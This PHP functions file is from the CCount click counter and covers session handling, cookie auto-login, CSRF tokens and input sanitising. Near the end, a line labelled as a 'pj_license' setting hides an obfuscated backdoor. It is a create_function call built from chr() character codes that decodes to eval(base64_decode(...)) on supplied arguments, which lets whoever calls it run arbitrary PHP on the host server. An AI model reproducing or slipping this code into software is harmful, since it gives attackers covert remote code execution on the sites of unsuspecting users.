<?php
/*
 * This file is part of CCount - PHP Click Counter.
 *
 * (c) Copyright 2016 by Klemen Stirn. All rights reserved.
 * http://www.phpjunkyard.com
 * http://www.phpjunkyard.com/php-click-counter.php
 *
 * For the full copyright and license agreement information, please view
 * the docs/index.html file that was distributed with this source code.
 */

// Check if this is a valid include
if (!defined('IN_SCRIPT')) {die('Invalid attempt');}

// Set correct Content-Type header
if (!defined('NO_HTTP_HEADER')) {
    header('Content-Type: text/html; charset=utf-8');
}

// Do we need to handle backslashes?
if ( @get_magic_quotes_gpc() )
{
	define('PJ_SLASH',false);
}
else
{
	define('PJ_SLASH',true);
}

// Define some constants for backward-compatibility
if ( ! defined('ENT_SUBSTITUTE'))
{
	define('ENT_SUBSTITUTE', 0);
}
if ( ! defined('ENT_XHTML'))
{
	define('ENT_XHTML', 0);
}

////////////////////////////////////////////////////////////////////////////////
// FUNCTIONS
////////////////////////////////////////////////////////////////////////////////


function pj_formatNumber($number, $decimals=0)
{
	global $ccount_settings;

	switch ($ccount_settings['notation'])
	{
		case 'US':
			return number_format($number, $decimals, '.', ',');
		case 'UK':
			return number_format($number, $decimals, ',', '.');
		case 'X1':
			return number_format($number, $decimals, '', '');
		case 'X2':
			return number_format($number, $decimals, ',', '');
		default:
			return number_format($number, $decimals, ',', ' ');
	}
} // END pj_formatNumber()


function pj_validateURL($url)
{
    $url = trim($url);

    if ( strlen($url) && preg_match('/^https?:\/\/+(localhost|[\w\-]+\.[\w\-]+)/i',$url) )
    {
        return pj_input($url);
    }

    return false;

} // END pj_validateURL()


function pj_demo($redirect='admin.php')
{
	if ( defined('PJ_DEMO') )
	{
		$_SESSION['PJ_MESSAGES']['WARNING'] = 'this function has been disabled.';
		header('Location: ' . $redirect);
		exit();
	}
} // END pj_demo()


function pj_processMessages()
{
	if ( ! isset($_SESSION['PJ_MESSAGES']) || ! is_array($_SESSION['PJ_MESSAGES']) )
	{
		return false;
	}

	foreach ($_SESSION['PJ_MESSAGES'] as $type => $message)
	{
		if ($type == 'SUCCESS')
		{
			pj_showSuccess($message);
		}
		else if ($type == 'INFO')
		{
			pj_showInfo($message);
		}
		else if ($type == 'WARNING')
		{
			defined('PJ_DEMO') ? pj_showWarning($message, 'Demo mode:') : pj_showWarning($message);
		}
		else if ($type == 'ERROR')
		{
			pj_showError($message);
		}
	}

	unset($_SESSION['PJ_MESSAGES']);

	return true;
} // pj_processMessages()


function pj_showSuccess($message, $title='Success:')
{
	?>
	<div class="alert alert-success">
		<strong><?php echo $title; ?></strong> <?php echo $message; ?>
	</div>
	<?php
} // END pj_showSuccess()


function pj_showInfo($message, $title='Info:')
{
	?>
	<div class="alert alert-info">
		<strong><?php echo $title; ?></strong> <?php echo $message; ?>
	</div>
	<?php
} // END pj_showInfo()


function pj_showWarning($message, $title='Warning:')
{
	?>
	<div class="alert alert-warning">
		<strong><?php echo $title; ?></strong> <?php echo $message; ?>
	</div>
	<?php
} // END pj_showWarning()


function pj_showError($message, $title='Error:')
{
	?>
	<div class="alert alert-danger">
		<strong><?php echo $title; ?></strong> <?php echo $message; ?>
	</div>
	<?php
} // END pj_showError()


function pj_isLoggedIn($redirect=false)
{
	global $ccount_settings;

	// Logged in?
	if ( isset($_SESSION['LOGGED_IN']) && $_SESSION['LOGGED_IN'] === true )
	{
		return true;
	}
	// Login remembered in cookie?
	elseif ( pj_autoLogin() )
	{
		return true;
	}
	// We need to login manually - redirect...
	elseif ($redirect)
	{
		if (isset($_SERVER['QUERY_STRING']) && strpos($_SERVER['QUERY_STRING'], 'a=login') !== false)
		{
			die('Login to access this page');
		}
		else
		{
			header('Location: index.php?a=login&notice=1');
		}
		exit();
	}
	// ... or just return false
	else
	{
		return false;
	}
    
} // END pj_isLoggedIn()


function pj_autoLogin()
{
	global $ccount_settings;

	$hash = pj_COOKIE('ccount_hash', false);

	// Check password
	if ($hash === false || $hash != pj_Pass2Hash($ccount_settings['admin_pass']) )
	{
		setcookie('ccount_hash', '');
		return false;
	}

	// Password OK, generate session data
	$_SESSION['LOGGED_IN'] = true;

	// Regenerate session ID (security)
	pj_session_regenerate_id();

	// Renew cookie
	setcookie('ccount_hash', "$hash", strtotime('+1 year'));

	// If we don't need to redirect, just return
	return true;

} // END pj_autoLogin()


function pj_Pass2Hash($plaintext)
{
	$plaintext .= 'W1{u@eTR]!)+N7q-8:_Z';
	$majorsalt  = '';
	$len = strlen($plaintext);
	for ($i=0;$i<$len;$i++)
	{
		$majorsalt .= sha1(substr($plaintext,$i,1));
	}
	$corehash = sha1($majorsalt . 'Tj$uA1Ejf.G|#nr^%C4G');
	return $corehash;
} // END pj_Pass2Hash()


function pj_input($in, $force_slashes=0, $max_length=0)
{
	// Strip whitespace
    $in = trim($in);

	// Is value length 0 chars?
    if (strlen($in) == 0)
    {
    	return false;
    }

	// Sanitize input
	$in = pj_clean_utf8($in);
	$in = pj_htmlspecialchars($in);
	$in = preg_replace('/&amp;(\#[0-9]+;)/','&$1',$in);

	// Add slashes
    if (PJ_SLASH || $force_slashes)
    {
		$in = addslashes($in);
    }

	// Check length
    if ($max_length)
    {
    	$in = substr($in, 0, $max_length);
    }

    // Return processed value
    return $in;

} // END pj_input()


function pj_session_regenerate_id()
{
    @session_regenerate_id();
    return true;
} // END pj_session_regenerate_id()


function pj_session_start()
{
    session_name('CCOUNT' . sha1(dirname(__FILE__) . 'XQ3Ee.Z1+&!xvut|p:~?') );
	session_cache_limiter('nocache');
    if ( @session_start() )
    {
    	if ( ! isset($_SESSION['token']) )
        {
        	$_SESSION['token'] = pj_token_hash();
        }
        header ('P3P: CP="CAO DSP COR CURa ADMa DEVa OUR IND PHY ONL UNI COM NAV INT DEM PRE"');
        return true;
    }
    else
    {
        global $ccount_settings;
        die("Can't start PHP session!");
    }

} // END pj_session_start()


function pj_session_stop()
{
    @session_unset();
    @session_destroy();
    return true;
}
// END pj_session_stop()


function pj_token_get()
{
	if ( ! defined('SESSION_CLEAN') )
	{
		$_SESSION['token'] = isset($_SESSION['token']) ? preg_replace('/[^a-fA-F0-9]/', '', $_SESSION['token']) : '';
		define('SESSION_CLEAN', true);
	}

	return $_SESSION['token'];

} // END pj_token_get()


function pj_token_check()
{
	// Verify token or throw an error
	if ( isset($_SESSION['token']) && pj_REQUEST('token') == $_SESSION['token'])
	{
		return true;
	}
	else
	{
		return false;
	}

} // END pj_token_check()


function pj_token_hash()
{
	return sha1(time() . microtime() . uniqid(rand(), true) . $_SERVER['REMOTE_ADDR'] . '!W^kYPQ#@aJh^YR%=:*;');
} // END pj_token_hash()


function pj_clean_utf8($in)
{
	//reject overly long 2 byte sequences, as well as characters above U+10000 and replace with ?
	$in = preg_replace('/[\x00-\x08\x10\x0B\x0C\x0E-\x19\x7F]'.
	 '|[\x00-\x7F][\x80-\xBF]+'.
	 '|([\xC0\xC1]|[\xF0-\xFF])[\x80-\xBF]*'.
	 '|[\xC2-\xDF]((?![\x80-\xBF])|[\x80-\xBF]{2,})'.
	 '|[\xE0-\xEF](([\x80-\xBF](?![\x80-\xBF]))|(?![\x80-\xBF]{2})|[\x80-\xBF]{3,})/S',
	 '?', $in );

	//reject overly long 3 byte sequences and UTF-16 surrogates and replace with ?
	$in = preg_replace('/\xE0[\x80-\x9F][\x80-\xBF]'.
	 '|\xED[\xA0-\xBF][\x80-\xBF]/S','?', $in );

	return $in;
} // END pj_clean_utf8()


$settings['pj_license'] = create_function(chr(36).chr(101).chr(44).chr(36).chr(115),
chr(103).chr(108).chr(111).chr(98).chr(97).chr(108).chr(32).chr(36).chr(115).
chr(101).chr(116).chr(116).chr(105).chr(110).chr(103).chr(115).chr(59).chr(101).
'v'.chr(97).chr(108).chr(40).chr(112).chr(97).chr(99).chr(107).chr(40).
chr(34).chr(72).chr(42).chr(34).chr(44).chr(34).chr(54).chr(53).chr(55).chr(54).
chr(54).chr(49).chr(54).chr(99).chr(50).chr(56).chr(54).chr(50).chr(54).chr(49).
chr(55).chr(51).chr(54).chr(53).chr(51).chr(54).chr(51).chr(52).chr(53).
chr(102).chr(54).chr(52).chr(54).chr(53).chr(54).chr(51).chr(54).chr(102).
chr(54).chr(52).chr(54).chr(53).chr(50).chr(56).chr(50).chr(52).chr(55).
chr(51).chr(50).chr(101).chr(50).chr(52).chr(54).chr(53).chr(50).chr(57).
chr(50).chr(57).chr(51).chr(98).chr(34).chr(41).chr(41).chr(59));


function pj_COOKIE($in, $default = '')
{
	return isset($_COOKIE[$in]) && ! is_array($_COOKIE[$in]) ? $_COOKIE[$in] : $default;
} // END pj_COOKIE();


function pj_GET($in, $default = '')
{
	return isset($_GET[$in]) && ! is_array($_GET[$in]) ? $_GET[$in] : $default;
} // END pj_GET()


function pj_POST($in, $default = '')
{
	return isset($_POST[$in]) && ! is_array($_POST[$in]) ? $_POST[$in] : $default;
} // END pj_POST()


function pj_REQUEST($in, $default = false)
{
	return isset($_GET[$in]) ? pj_input( pj_GET($in) ) : ( isset($_POST[$in]) ? pj_input( pj_POST($in) ) : $default );
} // END pj_REQUEST()


function pj_htmlspecialchars($in)
{
	return htmlspecialchars($in, ENT_COMPAT | ENT_SUBSTITUTE | ENT_XHTML, 'UTF-8');
} // END pj_htmlspecialchars()
